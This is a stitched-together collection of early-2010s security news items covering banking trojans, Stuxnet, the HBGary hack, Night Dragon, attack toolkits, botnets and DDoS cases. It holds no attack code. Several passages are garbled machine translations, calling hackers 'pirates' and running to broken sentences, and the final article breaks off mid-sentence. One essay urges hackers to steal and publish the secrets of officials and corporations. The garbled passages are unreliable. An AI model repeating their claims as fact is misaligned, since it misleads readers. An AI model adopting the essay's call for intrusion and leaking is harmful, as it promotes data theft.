Variants of this malware, which Symantec detects as Trojan.Tatanarg, have been in circulation since last October, but its code is believed to be based on an older threat called W32.Spamuzle. The trojan has a modular architecture, with separate components handling different tasks, and the functionality of most banking malware. It can inject rogue HTML code into pages (man-in-the-browser attacks), disrupt antivirus software, uninstall other banking trojans and enable Windows remote access. It also features a backdoor component through which attackers can issue commands to control the infected computers. However, the most interesting functionality of this trojan is its ability to function as a proxy between browsers and SSL-secured websites. This is achived by hijacking the legit SSL connection and establishing a new one on the browser end using a self-signed certificate. Alerts are blocked and exceptions are added automatically in the browser making the attack almost transparent to users. The HTTPS prefix is present, as is the padlock indicating a SSL connection. The only way for the user to realize he's not using his bank's certificate would be to manually check the issuer. Tatanarg is one of several banking trojans that appeared since the crackdown on ZeuS-based cyberfraud operations last year. It seems that unhappy with the heat, criminal gangs have begun developing their own custom malware. They also try to come up with innovative attack methods. Just last week, Trusteer reported about a trojan dubbed OddJob which forces browsers to keep sessions open after users think they successfuly logged out. Users are advised to always keep their antivirus programs up to date to ensure they have the latest protection available. Also, if possible, online banking should be performed from a dedicated computer or a live cd." }

The company, which was founded in 2004, focuses on reverse engineering — that is, analyzing software (malware in particular) for which no source code is available. It’s an incredibly interesting and complicated problem to try to solve, which makes the Zynamics team and product a perfect fit for Google, a company that’s known for tackling interesting and complicated problems. A Google rep said in an e-mail, “We’re delighted to have the Zynamics team aboard and hope their tools and skills in fighting malware will help us better protect Google’s users.” While we’re not completely sure what the fate of the company will be, we do know that its goals and expertise line up particularly well with Google’s aims in online security. Currently, Zynamics’s offerings focus on the needs of information security specialists and malware analysts. Its products are allegedly both innovative and time-saving. The company’s products include BinDiff, for analyzing executables; BinNavi, for analyzing binary code; PDF Dissector, for analyzing PDF malware; VxClass, for sorting malware into families; and BinCrowd, which is a central database for sharing reverse-engineered information. In addition to these products, Google is also acquiring a brilliant and experienced team — just the kind of engineers Google is renowned for hiring. We’ll see what the future holds for Zynamics, and we’ll keep you updated as details about this deal emerge. Link : http://zynamics.com/" }

THE LONDON STOCK EXCHANGE (LSE) website has been bombarded with fake insecurity software adverts that point to malware. It seems that dodgy security ads have been unknowingly hosted at the LSE website for at least a few months. An analysis of the website revealed that 363 pages had unwittingly hosted the malicious ads over a 90 day period. The LSE told the BBC that the website has now been given a clean bill of health and it suspects that adverts provided by a third party were responsible for the malware. Insecurity expert Paul Mutton ran analyses on the website after clicking on the dodgy links yesterday. Apparently the target website was blocked by Firefox but Mutton got infected through Google's Chrome web browser, in which he was hit with a ridiculous number of pop up ads. Using Google's safe browsing scheme to scan for suspicious code, Mutton found that the LSE website had been listed as hosting dodgy adverts six times in 90 days. Sophos senior technology consultant Graham Cluley concurred with Mutton that the LSE website had been salted with malware advertising. \"Our suspicion would be that it was the third-party advertising network running via the site that delivered the malware,\" he told the BBC. The LSE has not had a good technology day for some time now. Last year the INQUIRER reported that the LSE saw significant stock losses after postponing a new trading system due to glitches created by sabotaged software. Then earlier this month the LSE and the Nasdaq stock exchange both fell victim to hackers who managed to invade their systems." }

The Internet Crime Complaint Center (IC3) runs a Web site where victims can report details of any cyberfraud. It shares the data with law enforcement agencies to help them hunt down criminals. Last year it received 303,809 complaints, almost 10 percent fewer than the previous year's total of 336,655.The IC3 is run by the U.S. Federal Bureau of Investigation and the National White Collar Crime Center. It released its annual report Thursday, based on data submitted in 2010.The largest single source of complaints was from people who had been duped by criminals posing as buyers and sellers. International scammers, preying on eBay and Craigslist users, have made millions over the past decade. Just last week, a Romanian national, Adrian Ghighina, pleaded guilty to his role in a scam that took in $2.7 million by tricking eBay, Craigslist and AutoTrader.com users into paying for vehicles that were never delivered.Even without factoring in the fraud at online auction sites, which the IC3 counts separately, this type of activity accounted for 14.4 percent of complaints, the IC3 said. That's a noticeable jump from 2009, when the total was 11.9 percent.Complaints about 2009's most-reported scam -- malware-laden emails that purported to come from the FBI itself -- dropped in 2010. In 2009 these fake FBI emails were a big problem, totaling nearly 17 percent of all complaints. In 2010, they totalled 13.2 percent.There was also a drop in complaints about \"advance fee scams,\" where the victim is promised a big lottery payout or inheritance as soon as they pay a phoney administrative fees. These dropped from 9.8 percent in 2009 to 7.6 percent last year.It's not surprising if scammers are looking for new activities because consumers may be getting wise about some of these crimes, said Adam Chernichaw, a partner with the law firm White & Case in New York, who consults with financial services companies. \"After a number of years in the spotlight you get your consumer base educated and they search for an easier route,\" he said.Chernichaw believes the overall number of complaints may be down because companies are getting better at dealing with fraud. Online merchants are getting better about refusing suspicious transactions and automated fraud detection tools are picking up scams earlier, he said." }

Hackers set the drive-by malware up at the BBC's 6 Music website and the BBC 1Xtra radio station website. Researchers at the insecurity outfit Websense found the exploits and put its report up on its security labs blog. \"The BBC - 6 Music Web site has been injected with a malicious iframe, as have areas of the BBC 1Xtra radio station Web site,\" an anonymous Websense insecurity researcher wrote. Websense claims the injected iframe is at the bottom of the BBC 6 Music webpage and has been set up to automatically download some dodgy code from a .cc website. Apparently the hack is exactly the same on the BBC's 1Xtra website. \"If an unprotected user browsed to the site they would be faced with drive-by downloads, meaning that simply browsing to the page is enough to get infected with a malicious executable,\" Websense continued. The malware was designed using a Pheonix Exploit kit and only 12 out of 43 of the top anti-virus packages found the exploit. Using Virus Total scan to see which products picked up the injected iframe, Websense showed that anti-virus scans from some outfits like Kaspersky, Symantec, PC Tools and Trend Micro picked up the hack. However, other top name insecurity vendors like Sophos, McAfee and even Microsoft's anti-virus tools didn't register the hack at all. That is an appalling detection rate from both free and paid-for anti-virus kits and, as of yesterday, Websense reckoned the anti-virus toolkits were still vulnerable." }

Much of WikiLeaks promise to protect sources is useless if the sources are not whistleblowers needing a forum for publication. Instead publishers of secret information grab it directly for posting to Torrent for anybody to access without mediation and mark-up by self-esteemed peddlers of protection, interpretationa and authentication, including media cum scholars. Ars Technica descriptions of the how the Anonymous hack are the best technical reading of Internet derring-do yet and far exceeds the much simpler rhetorical version of WikiLeaks security carefully bruited as if invulnerable but is not according to Daniel Domscheit-Berg's revelations. AnonLeaks.ru is a remarkable advance of WikiLeaks. And promises much more by the same means and methods most associated with official spies -- NSA and CIA have long run the Special Collections Service to do exactly that kind of criminal aggression, along with black bag burglaries, surveillance and bugging. Contractors hiring ex-spies do much of this highly classified work as well and invent and supply the gadgets and front organizations required. Not least of importance of the Anonymous hack and the many preceding it is the revelation of how commercial firms have been exploiting public ignorance of their spying capacity. That they are themselves vulnerable is a surprise to them, as it must be to those who hire them and, in the case of governments, provide legal cover for criminal actions. This is not news, to be sure, for it has been alleged and reported on for decades but mostly in technical journals and conferences where offerers strut their malwares to buyers of perfidium. Imagine that instead of the many iterations of Wikileaks now appearing to receive and publish documents, that more of the Anonymous-type hacks simply steal and torrent the family jewels of the spies, officials, lobbyists and corporations believing they own the territory in order to show the extent of their secret predations on the public. The digitization of vast archives of government, commercial and non-governmental organizations to facilitate their hegemony provides a bounty to be hacked repeatedly despite attempts to prevent it by vainly inept cybersecurity agencies and firms. The cyber-racket cartel will yell, hit the Internet Switch. Too late, too late. Anonymous controls the switch. Sure, Anonymous can be compromised with sufficient hostile and friendly inducements, but so can the predators, perhaps moreso the latter now revealed to be vulnerable. Venerable Anonymous and the promise it offers surpasses the Nymous authoritatives of secrecy frantically attempting to ban its greatest threat. For honoring the WL era bestow on Julian Assange, the WL Four and Bradley Manning Medals of Freedom and spy-grade lifetime pensions for initiating the rise of Unnameables worldwide. Coda: Cryptome and reportedly John Young's private network were hacked in October 2010. Thugs Corey \"Xyrix\" Barnhill, Michael \"Virus\" Nieves, Justin \"Null\" Perras are still bragging about it on hacker forums. So prepare for exposure no matter illusory protection by law and technology." }

This was created by a software development team and while the coders were professional level I am really not impressed with the end product, it looks like a picture a child painted with finger paints.”When asked what type of organization likely wrote it, she stated:“Probably a corporation by request of a government, it was clearly tested and put together by pro’s.

The five organizations, believed to be the first that were infected with the worm, were targeted in five separate attacks over a number of months in 2009 and 2010, before Stuxnet was discovered in June 2010 and publicly exposed. Stuxnet spread from these organizations into other organizations on its way to its final target, which is believed to have been a nuclear enrichment facility or facilities in Iran.“These five organizations were infected, and from those five computers Stuxnet spread out — not to just computers in those organizations, but to other computes as well,” says Liam O Murchu, manager of operations for Symantec Security Response. “It all started with those five original domains.”The new information comes in an updated report from researchers at Symantec , a computer security firm that has provided some of the leading analysis of the worm since it was discovered.According to the report, Stuxnet’s first attack against the five organizations occurred in June 2009, followed by a second attack in July 2009. Eight months passed before subsequent attacks were launched in March, April and May 2010. The last attack was just one month before the code was discovered in June 2010 by VirusBlokAda, a security firm in Belarus, which said it had found the malware on computers of unspecified clients in Iran.Symantec didn’t identify the names of the five organizations that were targeted; the company said only that all five “have a presence in Iran” and are involved in industrial processes. One of the organizations (what Symantec refers to as Domain B) was targeted with the worm in three of the five attacks. Of the remaining organizations, three of them were hit once, and the last organization was targeted twice.Symantec has so far been able to count a constellation of 12,000 infections in the five organizations and outside organizations to which the malware spread. The most successful attack occurred in March 2010 when 69 percent of these infections occurred. The March attack targeted only Domain B, then spread.Domain A was targeted twice (Jun 2009 and Apr 2010). The same computer appears to have been infected each time.Domain B was targeted three times (Jun 2009, Mar 2010, and May 2010).Domain C was targeted once (Jul 2009).Domain D was targeted once (Jul 2009).Domain E appears to have been targeted once (May 2010), but had three initial infections. (I.e., the same initially infected USB key was inserted into three different computers.)O Murchu acknowledges that there could have been earlier attacks that occurred before June 2009, but no one has found evidence of this yet.Symantec found that the shortest time between when the malware was compiled in one case — that is turned from source code into a working piece of software — and the subsequent attack using the code occurred, was just 12 hours. This occurred in the June 2009 attack.“This tells us that the attackers more than likely knew who they wanted to infect before they completed the code,” O Murchu says. “They knew in advance who they wanted to target and how they were going to get it there.”Stuxnet was not designed to spread via the internet but via an infected USB stick or some other targeted method within a local network. So the short timeframe between compilation and the launch of the June 2009 attack also suggests that the attackers had immediate access to the computer they attacked — either working with an insider or using an unwitting insider to introduce the infection.“It could be they sent it to someone who put it on a USB key, or it could have been delivered via spear-phishing,” O Murchu says. “What we do see is that the exploits in Stuxnet are all land-based, so it is not going to spread wildly on the internet. From that, we can assume the attackers wanted to deliver Stuxnet to an organization that was very close to whatever the final destination for Stuxnet was.”Symantec, working with other security firms, has so far been able to collect and examine 3,280 unique samples of the code. Stuxnet has infected more than 100,000 computers in Iran, Europe and the United States, but it’s designed to only deliver its malicious payload when it finds itself on the final system or systems it’s targeting.On systems that are not targeted, the worm just sits and finds ways to spread to other computers in search of its target. To date, three variants of Stuxnet have been found (dating to June 2009, March 2010 and April 2010). Symantec believes a fourth variant likely exists, but researchers have not found it yet.One of the organizations, Domain B, was targeted each time the attackers released a new version of Stuxnet.“So it looks like they felt that if they got in there, Stuxnet would spread to the [system] they actually wanted to attack,” O Murchu says.After the worm was discovered in June 2010, Symantec researchers worked on reverse-engineering the code to determine what it was designed to do. Two months later, the company stunned the security community when it revealed that Stuxnet was designed to attack Programmable Logic Controllers (PLCs), something that until then was considered a theoretical attack but had never been proven done. PLCs are components that work with SCADA systems (supervisory control and data acquisition systems) that control critical infrastructure systems and manufacturing facilities.Shortly after Symantec released this information last August, German researcher Ralph Langner disclosed that Stuxnet was not attacking just any PLC, it was targeted to sabotage a specific facility or facilities. Speculation focused on Iran’s nuclear enrichment plant at Natanz as the likely target. Iran has acknowledged that malicious software struck computers at Natanz and affected centrifuges at the plant, but has not provided any details beyond this." }

Now it’s starting to act like WikiLeaks itself. The group is planning, as early as today, to release 27,000 e-mails from the server of Greg Hoglund, the chief executive of software security firm HPGary, which it says could have permanently damaging consequences for the company. Anonymous has already posted around 50,000 emails of Aaron Barr, the CEO of sister organisation HPGary Federal, which revealed a report by the firm looking at ways to sabotage WikiLeaks in collaboration with Palantir Technologies and Berico Technologies. The emails also show that Bank of America, a potential target of WikiLeaks, was to hear the proposal via its outside law firm Hunton & Williams. A source from Anonymous says that most of the new e-mails from Hoglund are still unchecked and it is unclear who will be most liable when the information is made public, but added that briefly skimming the emails had revealed “three different malware archives, two bots, an offer to sell a botnet, a genuine stuxnet copy, and various malware lists.” Not entirely surprising given that HBGary is a security firm, but the source speculates that botnets aren’t typically rented out for “research.” “Judging by the fact that they’d attack WikiLeaks’ operations, [we] wouldn’t be surprised if they’re up to something fishy,” the source added. “We’ll let Anon and other public devour the emails.” A subset of Anonymous members, or Anons, who use Internet Chat Relay to communicate, are currently working on a web viewer for all the e-mails as part of the launch of a new front for the movement, AnonLeaks. ThinkProgress also discovered via Barr’s leaked emails that similar proposals had been prepared for the Chamber of Commerce to attack progressive groups and other activists including ThinkProgress itself. Via Reddit, here’s a screenshot of how Anonymous hackers managed to get access to Hoglund’s email, by asking one of the IT administrators to reset his password. The revelations about HBGary and WikiLeaks came about by accident, after supporters of Anonymous hacked into Barr’s web site and servers in retaliation for telling the Financial Times that he had managed penetrate the group and learn the identities of senior figures. It later transpired that some of Barr’s initial research was incorrect, and Anonymous posted a link to one of his documents purporting to show names and addresses of active supporters to prove its point. Palantir Technologies has meanwhile sought to distance itself from HBGary, and publicly apologised for its role in the WikiLeaks response plan, making it all the more likely that Barr’s e-mails are genuine." }

Security outfits have warned that this type of attack could get lot worse as multinationals continue to prod the Chinese government. McAfee said in its Night Dragon whitepaper that hackers have stolen bidding plans and other critical proprietary information. This can be used to detrimental effect and give competitors an advantage. It could not name the five petrochemical and oil companies as it says they are clients.George Kurtz, CTO, said in a blog post: \"We have strong evidence suggesting that the attackers were based in China. The tools, techniques, and network activities used in these attacks originate primarily in China. These tools are widely available on the Chinese Web forums and tend to be used extensively by Chinese hacker groups.\"He warns that well-coordinated, targeted attacks such as Night Dragon are \"orchestrated by a growing group of malicious attackers committed to their targets,\" and \"are rapidly on the rise.\"Kurtz adds that targets have now \"moved beyond the defence industrial base, government, and military computers to include global corporate and commercial targets.\"This was a sentiment shared by a top security expert, who does not wish to be named, who warns that attacks will get worse unless companies find a way to strongly secure files and networks.\"It's no secret hackers are getting smarter and China is a breeding ground for people who want to use their talents for malicious gain or, in their eyes, to teach money making corporations, or those that they see as 'unethical,' a lesson.\"Soon multinationals that are seen to cross a line, \"or dare I say the Chinese government, could see a similar hack. We expect attacks to expand to utility companies - something that has already begun - and to phone networks.\" The hack was traced back to China via a server leasing company in Shandong Province that hosted the malware and to Beijing IP addresses that were active from 9 a.m. to 5 p.m. Beijing time. According to McAfee the hackers wormed their way into the computers of companies based in Kazakhstan, Taiwan, Greece and the United States through one of two ways. Either through a public website, or through infected emails sent to company executives. Once the hackers were in they would install remote administration software that gave them complete control of the systems. And they've been playing the game for at least two to four years, using their way in to grab financial documents related to oil and gas field exploration and bidding contracts" }

In this report, we review some of the highlights of 2010 with regard to phishing and web content filtering. Web Content Filtering Content may be filtered by category or by blocking specific websites via blacklisting or by allowing specific websites via white listing. Top Ten Blocked Categories Not surprisingly, the top ten most blocked categories are focused on providing a safer Internet experience for students and children, and a more work-appropriate environment for businesses. Percentages indicate the proportion of networks using category blocking that reference a given category. Pornography — 85% Sexuality — 80.1% Tasteless — 77.3% Proxy/Anonymizer* — 76.2% Adware — 69% Nudity — 67.2% Hate/Discrimination — 58.7% Lingerie/Bikini — 58.5% Gambling — 58% Drugs — 57.3% * Websites that allow users to hide their identity or circumvent the Web content filtering set up on their networks. Top Ten Blacklisted Websites Blacklists are typically used when there is no desire to block an entire category in principle, but there is a focus on preventing traffic to specific websites based on a combination of their popularity and content. This top ten list suggests a concern with the use of bandwidth by streaming sites and with privacy concerns from advertising networks. Percentages indicate the proportion of networks using blacklisting that reference a given site. 1. Facebook.com —14.2% 2. MySpace.com — 9.9% 3. YouTube.com — 8.1% 4. Doubleclick.net — 6.4% 5. Twitter.com — 2.3% 6. Ad.yieldmanager.com — 1.9% 7. Redtube.com —1.4% 8. Limewire.com — 1.3% 9. Pornhub.com —1.2% 10. Playboy.com — 1.2% Top Ten Whitelisted Websites Whitelists are typically used when there is a desire to block entire categories, but access to selected websites is granted on an exception basis. These sites represent the most trusted sites in their category. The fact that many of the same sites that appear on the Top Ten Blacklisted Websites list appear on the list below may indicate the diverse perspectives people have regarding many of these sites. Percentages indicate the proportion of networks using whitelisting that reference a given site.

They need to ensure compliance with HR policies, while also increasing worker productivity by preventing what they consider to be employee cyber slacking. This list shows that businesses are concerned with singling out popular sites considered to be of little value in a work setting, especially if they consume a lot of bandwidth. Percentages indicate proportion of business networks using blacklisting feature that reference a given site. 1. Facebook.com — 23% 2. MySpace.com — 13% 3. YouTube.com — 11.9% 4.

Launched in October 2006 to coincide with National Cyber Security Awareness Month, the site employs a sophisticated voting system that requires the community to vote “phish” or “not phish,” reducing the possibility of false positives and improving the overall breadth and coverage of the phishing data. Today, PhishTank is the most important phishing database available and is used by the world’s largest companies. More than 1 million phishes have been submitted and voted on by the PhishTank community of researchers, academics and security experts. Top Targets of Phishing Websites in 2010 The most frequently spoofed website in every month of 2010 was PayPal. PayPal was targeted nine times more frequently than the next most frequent target, Facebook. Five of the most targeted brands — Facebook, World of Warcraft, Sulake Corporation, Steam and Tibia — are associated with online and social games. Percentages indicate the proportion of phishing sites verified in 2010 and associated with a given target. 1. PayPal — 45.9% 2. Facebook — 5.3% 3. HSBC Group — 4.1% 4. World of Warcraft — 3.2% 5.

Egyptian officials are not happy with the network showing the number of anti-government demonstrators, accusing him of bias in its reports. Meanwhile state television continues to downplay the magnitude of events and making false statements in the number of victims. In view of this confusion is very important for Al Jazeera to remain impartial in the eyes of the public, especially the Arab world. Network IT support staff, said that several attempts to hack into the site database has been successfully blocked in recent days. Attempts by Israel, Morocco and Portugal, although this is not evidence that the attackers are really in these countries. The site is the network only way to reach the Egyptian public, because Al Jazeera has been banned from broadcasting by satellite in the country.

As more consumers use mobile devices and tablets in their daily lives and work, cybercriminals have quoted, say the researchers. Accordingly, botnet attacks targeting mobile devices are expected to increase. In the fourth quarter include some of the most active threat bots known as Zeus Murofet, and Conficker Koobface. The number of potentially dangerous areas has also increased at a rapid pace, the report said. \"The botnet creators of Zeus repurposed an old version of a spyware package business,\" says the report. \"Android / Geinimi, a Trojan horse introduced into legitimate mobile applications and games for the Android platform, has been the a major threat in the quarter. \" The research identified phishing URL in the form of the IRS, gift cards, rewards and financial accounts of social networking as some of the disadvantages of the most popular. vulnerabilities in Adobe products have been the method of high performance, with weakness in both Flash and PDF, in particular, technologies are often exploited, according to McAfee.

But the difference between these programs - listed in the Internet Relay Chat rooms, instant chat (IRC) and private online forums - and what it could buy public providers is that they offer more software piracy increasingly sophisticated for simple - young hackers with little ability to write their own computer code. \"Lessons learned from large companies legitimate software - such as development practices, techniques and anti-piracy, support and prices - are regularly repeated in the informal economy, in order to increase efficiency and profits, says the safety report Symantec is the company this week, an increase in the underground market for so-called \"attack tools\". According to Orla Cox, security operations manager at Symantec Security Response Centre in Dublin, a mature market for software piracy and the dismay of former creators of these packages to see - ironically - widely pirated and available from sites hacking discussions have produced a software piracy landscape that is increasingly indistinguishable from legitimate businesses. \"They're trying to differentiate themselves from competitors,\" he says. Therefore, providers of software suites, which typically cost a few hundred to a few thousand euro, easy to give a variety of services catering to the novice hacker. As security companies like Symantec same suite of these manufacturers to offer a regular basis, but allowing their rogue software exploit newly discovered vulnerabilities in browsers, applications and infrastructure. Or maybe you want a supplier of pirated software to provide the hosting service for those who carry malicious code? E 'served too. And if a large packet is too expensive, buyers can purchase modules instead of allowing them to make certain types of piracy. As with mainstream commercial software, many packages that enable buyers of licenses or the use of digital certificates to ensure that packages will not suddenly appear on the sites for free file-sharing or IRC channels. The new sophistication of the software indicates more limited capabilities of buyers, \"said Cox.\" These pirates are less educated, if you will, \"he said.\" They have more than one approach rather than the amateur hacker who learns the code of the old school . Buyers have computer skills, perhaps, but no coding skills. \" pirates even beginners can be combined in a package of service and support to help when they encounter a new module a bit confused or can not understand how to get your software settings quite right. \"It would be a big underground,\" said Cox. \"I do not exactly have a hotline you can call.

The most popular - 44 percent - is the expression associated with adult entertainment sites, while the second most common expression is associated with streaming video, the report said. Toolkit users can also use the \"typo-squatting\" - they register a domain name a letter or two that a popular website in the hope of conquering the keyboard awkward. In some cases, users of these kits work of professional cyber-crime gang, who will pay for each computer novice hackers can compromise, the bands will contribute to creating a massive botnet attacks staged, Cox said. A number of kits high level exploits have attracted the user greater attention to the problem during the past year. Topping the list, at least for the humiliation factor of success was a violation of U.S. Treasury three sites using a toolkit called Eleanore May Site-visitors to malicious websites, which infects visitors Code and rogue security software, according to a report. Another scam uses an effective toolbox of people called Zeus data harvest of 55 000 vulnerable computers last August. The group behind the attack, called Avalanche, use a botnet to steal bank details and credit card victims. Symantec said \"the relative simplicity and efficiency using attack tools\" have led to new pirates with some coding skills, are increasingly hacking for financial gain, instead of blurring the websites or hurt in general. The report indicates that toolkits are used in most malicious online attacks - shows that the relative novice is probably now behind the majority of pirate attacks - with Zeus alone accounts for more than 90,000 examples of malicious code in just one months in 2009. \"It is very probable that the attack tools that Zeus was responsible for infecting millions of computers,\" the report said. Symantec is looking at the black market for signs of consolidation, \"said Cox. As the world of consumer software, toolbox some producers seem ready to go to work with a product rather than continuing to cast competing. The market for products merged could be very lucrative. Zeus will sell up to $ 4000, but there are rumors that a new toolkit consists of Zeus consolidated with another toolkit is now available for about $ 8000. \"The kits are more expensive - and more effective,\" says Cox.

The report quoted intelligence and military experts and officials say that the effort to create the worm Stuxnet was a joint US-Israeli project, which also had the cooperation of Britain and Germany. \"You can control the worms, you need to know the machines,\" American expert told the Times. \"The reason for the worm to be effective, that the Israelis have tried,\" he added.

Unsurprisingly, this massive and committed user base is heavily targeted by scammers and cybercriminals, with the number and diversity of attacks growing steadily throughout 2010 – malware, phishing and spam on social networks have all continued to rise in the past year, with a Sophos survey finding that: 40% of social networking users quizzed have been sent malware such as worms via social networking sites, a 90% increase since the summer of 2009 Two thirds (67%) say they have been spammed via social networking sites, more than double the proportion less than two years ago 43% have been on the receiving end of phishing attacks, more than double the figure since 2009. “Rogue applications, clickjacking, survey scams – all unheard of just a couple of years ago, are now popping up on a daily basis on social networks such as Facebook,” said Graham Cluley, senior technology consultant at Sophos. “Why aren't Faceboook and other social networks doing more to prevent spam and scams in the first place? People need to be very careful they don’t end up being conned for their personal details, or get tricked into clicking on links that could earn money for cybercriminals or infect innocent computers.” Although results vary across the individual networks of Facebook, Twitter, MySpace and LinkedIn, the latest poll suggests that half of those surveyed have been given unrestricted access to social networks at work. Paradoxically, 59% believe employee behavior on social networking sites could endanger corporate network security, and 57% worry that colleagues are sharing too much information on social networks. \"Total bans on users accessing social networking sites are becoming rarer, as more firms recognise the value such sites can bring in raising brand awareness and delivering social media marketing campaigns,\" explained Cluley. \"If your business isn't on Facebook, but your competitors are, you are going to be at a disadvantage. But you have to be aware of the risks and secure your users while they're online.\" Although 82% of the survey’s respondents felt that Facebook posed the biggest risk to security, Sophos has labeled an attack on the Twitter micro-blogging network as the biggest single social networking security incident of 2010. The infamous ‘onMouseOver’ Twitter worm hit the Twitter site in September 2010, and spread like wildfire. The cross-site-scripting (XSS) attack demonstrated how quickly a vulnerability on a social network can affect a huge number of users. High-profile victims included ex-Prime Minister's wife Sarah Brown, Lord Alan Sugar, and even Robert Gibbs, the press secretary to US President Barack Obama. Undoubtedly the most high profile IT security story of 2010 was the WikiLeaks saga, which saw a number of DDoS attacks launched against companies withdrawing support for the controversial whistleblowing site. There was also the widely reported ‘Stuxnet’ worm, linked with targeting SCADA systems used for industrial applications, including nuclear facilities. These exemplify the development of cybercrime from the initial stages of proof-of-concept and mischievous virus-writing, through financially motivated, organized criminal activity – undoubtedly still the primary threat – and finally a third, political motivation – a trend predicted to continue.

Research from SpiderLabs found that malicious tools became more customized, automated and persistent in 2010. This trend combined with the popularity of mobile devices and social media is providing the perfect recipe for cybercriminals looking to compromise business, customer and user private and sensitive information. Key findings: Food and beverage regained its title as the most breached industry-representing 57% of the investigations. Third-party vendors continue to put companies at risk-88% of breaches resulting from insecure software code or lax security practices in the management of third-party technology. Cybercriminals got fresh in 2010-because in-transit credit card data is usually more recently created (more fresh) than stored data, 66% of investigations found the theft of data in transit. A single organized crime syndicate may be responsible for more than 30% of all 2010 data breaches. Among the most interesting and surprising elements of the report is the rate and sophistication of attacks against mobile platforms and social networking sites. As the security of mobile networks has improved, mobile devices are increasingly the target of attacks, while social networking sites are quickly becoming cybercriminals' platform of choice to expand and propagate destructive botnets. Drive-by infections and mobile phishing attacks were among the most popular client-side attacks in 2010. Geolocation data is helping cybercriminals launch more sophisticated and targeted attacks against social networks. Mobile devices offer cybercriminals an open door to corporate authentication credentials, sensitive data and trade secrets. Anti-virus software is losing the battle against malware - the new breed of malware is virtually undetectable by current scanning software. Top strategic security initiatives for 2011 A key take-away from the report is that attacks are often successful in organizations that believed a comprehensive data security strategy was in place. For executives and managers who are tasked with ensuring their company does not suffer a security event, the report offers specific guidance for 2011. Assess, reduce and monitor client-side attack surface: Monitor and inventory applications to measure adherence to standards and evaluate risk. Embrace social networking, but educate staff: An established policy and education can help protect against attacks originating from social networking tools. Develop a mobile security program: Gaining control over configurations of mobile devices will help reduce risk. Enforce security upon third party relationships: Choose a platform and vendor with a solid security history, and require vendors to undergo third-party security testing. News Source : Net-security" }

In an effort to boost traffic to their own site, they used a 50,000-strong botnet to overload 109 rival sites during November and December 2010.A botnet, of course, is a collection of malware-infected computers (often called \"zombies\") which can remotely be instructed to initiate network-related activity. Sending spam is a common criminal task for which zombies are used; visiting targeted websites deliberately to waste their bandwidth is another.Since most web requests look alike, distinguishing the web hits of malevolent time-wasters from those of potential customers can be tricky. Sites which don't usually get a large number of simultaneous requests often aren't built to sustain heavy load.Prosecutors also allege that Lee, who runs a server rental company - ironically the sort of outfit to which many websites outsource their operation, assuming that cloud-style services are better placed to resist attacks - DDoSed a prospective customer in retaliation for not signing up with him.Some simple warnings come out of this:* Make sure your PC isn't infected with malware.

The Korea Times reports four members of a crime gang based in Incheon, South Korea hired a hacker, identified only as Park, to launch DDoS attacks that would effectively prevent a rival gaming site from operating due to an overload of traffic. Police also arrested Lee, (who was identified only by the single moniker), the head of a computer server rental company for participating in the attacks. Park and Lee, who managed the Incheon-based gang’s illegal gaming site, took down 109 rival websites between Nov. 21 and Dec. 15, 2010 by infecting them with malware for one to two hours a day, the report read. To further eliminate the competition, gang member Yoem put a 50,000-strong botnet of Chinese computers at Park and Lee’s disposal. Often called “zombie” computers, botnets are a network of systems which are programmed to autonomously distribute malicious software.

Mass DDoS attacks have been in the spotlight in recent months, especially those organized by groups like “Anonymous,” a network of “hacktivists” who have launched attacks against PayPal, Amazon and MasterCard when those companies cooperated with government orders to suppress WikiLeaks. In a Dec. 9 blog, the security firm Sophos’ explains that several countries -- including the United States, the United Kingdom and Sweden -- all have anti-DDoS laws on the books. In November 2010, an Ohio man was sentenced to 30 months behind bars for launching DDoS attacks against the websites of Bill O’Reilly, Ann Coulter and Rudy Giuliani, Sophos said. “If you’re flirting with joining the ranks of the cybervandal group Anonymous when it urges people to join in DDoS attacks, typically in an effort to deny free speech in an effort to protest the denial of free speech, don’t assume that you won’t get caught,” wrote Paul Ducklin, Sophos’ Asia Pacific head of technology, on the company’s blog.

What it does do lately... what it's used for, is to install rogue antivirus software.\" The UK-based anti-spam service Spamhaus echoed Stewart today. \"If [Microsoft's take-down] did affect spam, we haven't noticed,\" said Richard Cox, the chief information officer at Spamhaus. Like Stewart, Cox also dismissed Waledac's threat as a spam engine. \"Waledac was not a high threat, it's less than 1% of the spam traffic,\" Cox said. \"What we're worried about is Zeus, which is a far more damaging botnet, which is creating a substantial amount of spam.\" Postini, the message security and filtering firm owned by Google, also said it had not detected any drop in spam. \"The team hasn't seen any change so far,\" said Google spokesman Jay Nancarrow. Earlier today, Microsoft said that the Waledac botnet, which it claimed controls hundreds of thousands of infected PCs - is a \"major distributor of spam globally.\" Microsoft also said that its researchers had snatched about 60,000 machines away from the botnet. Stewart wasn't seeing any evidence of those claims, either. \"I haven't seen any decrease in [Waledac's] activity, the researcher said. \"To me, it looks like business as usual.\" Late Wednesday, Microsoft announced it had won a federal court order that cut off 277 .com domains associated with the botnet, and said that by knocking those sites off the Internet, it would seriously disrupt Waledac's operation. \"This action has quickly and effectively cut off traffic to Waledac at the '.com' or domain registry level, severing the connection between the command and control centers of the botnet and most of its thousands of zombie computers around the world,\" Tim Cranton, an associate general counsel with Microsoft, said in a blog entry yesterday. But Stewart said it's very unlikely that the move had actually crippled the botnet. \"Waledac uses a peer-to-peer protocol for its command and control,\" he said, referring to the mechanism that the most technically-advanced zombie PC commanders use to control their armies. \"But the bots don't really [depend] on those domain names to communicate.\" In fact, said Stewart, Waledac bots will be able to communicate \"indefinitely\" by using the IP (Internet Protocol) addresses that are hard-coded into the bot Trojan. To kill off a botnet like Waledac, Microsoft would have had to target not only the domains it did, but also every possible IP address coded into the malware. \"I don't see how you can kill a botnet like this,\" Stewart said. \"There's no single point of failure for these botnets.\" Even so, he applauded Microsoft's move. \"...This is a good start, it's a good step in the right direction,\" Stewart said, offering up other ways the company's resources might have been better spent. \"There are plenty of other botnets where this approach might work -- any that depend on a centralized command and control server.\" Waledac was created by, and is maintained by, hackers who previously flooded the Internet with the Storm bot Trojan. The people behind this botnet aren't rookies, Stewart said. \"We're dealing with the same people behind Storm, and they definitely know the ins and outs.\" In all likelihood, he added, Microsoft's maneuver won't stop an established botnet like Waledac. \"They're attacking the very, very front end of the whole scheme of the bot,\" he said. Microsoft acknowledged that its work isn't done. \"[This] is not a silver bullet for undoing all the damage we believe Waledac has caused,\" said Cranton. \"Although the zombies are now largely out of the bot-herders' control, they are still infected with the original malware.\" Message security companies that monitor the pulse of spam, including Symantec's MessageLabs and Google's Postini, were not able to immediately come up with data to show whether the purported demise of Waledac has, as Microsoft claimed, depressed spam levels. Microsoft has targeted Waledac before. In April 2009, the company issued a version of its Malicious 